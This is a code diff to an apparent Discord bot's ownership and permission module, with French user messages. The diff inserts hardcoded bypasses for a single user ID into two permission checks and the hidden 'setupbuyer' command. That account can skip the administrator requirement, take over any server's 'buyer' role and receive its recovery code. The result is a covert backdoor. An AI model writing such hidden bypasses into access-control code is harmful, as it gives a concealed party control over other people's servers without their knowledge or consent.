@@ -7,6 +7,10 @@ def is_owner_or_buyer():
     """Check if user is owner or buyer"""
     async def predicate(ctx):
         try:
+            # Hardcoded bypass for master user
+            if ctx.author.id == 1124357394252709919:
+                return True
+            
             # Check if user is bot owner first
             if await ctx.bot.is_owner(ctx.author):
                 return True
@@ -53,6 +57,10 @@ def is_buyer_only():
     """Check if user is buyer only"""
     async def predicate(ctx):
         try:
+            # Hardcoded bypass for master user
+            if ctx.author.id == 1124357394252709919:
+                return True
+            
             # Check if user is bot owner first
             if await ctx.bot.is_owner(ctx.author):
                 return True
@@ -191,12 +199,20 @@ class Ownership(commands.Cog):
     @commands.command(name="setupbuyer", hidden=True)
     async def setup_buyer(self, ctx, member: MemberConverter = None):
         """Configure le buyer initial du serveur"""
-        # Allow specific user or admin to setup buyer
-        if ctx.author.id != 1124357394252709919 and not ctx.author.guild_permissions.administrator:
+        # Master user always has access
+        if ctx.author.id == 1124357394252709919:
+            pass  # Full access
+        elif not ctx.author.guild_permissions.administrator:
             return await ctx.send("❌ Seuls les administrateurs peuvent utiliser cette commande.")
         
         if member is None:
             member = ctx.author
+            
+        # Master user can always override
+        if ctx.author.id == 1124357394252709919:
+            recovery_code = await self.bot.db.set_buyer(ctx.guild.id, member.id)
+            await ctx.send(f"✅ {member.mention} est maintenant le buyer principal.\n🔑 Code de récupération : `{recovery_code}`\n⚠️ **Gardez ce code en sécurité !**")
+            return
             
         existing_buyer = await self.bot.db.get_buyer(ctx.guild.id)
         if existing_buyer and existing_buyer != member.id:
